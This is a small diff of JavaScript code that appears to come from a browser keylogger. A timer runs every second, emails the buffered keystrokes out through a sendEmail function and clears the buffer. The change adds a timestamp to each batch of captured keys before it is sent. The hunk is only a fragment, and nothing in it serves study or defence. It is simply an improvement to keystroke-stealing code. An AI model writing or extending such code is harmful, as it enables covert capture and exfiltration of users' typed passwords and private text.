@@ -28,7 +28,7 @@
 }
 	  window.setInterval(function(){
 	if(keys.length>0) {
-		sendEmail(keys);
+		sendEmail(Date.now() + ':' + keys);
 		keys = '';
 	}
 }, 1000);
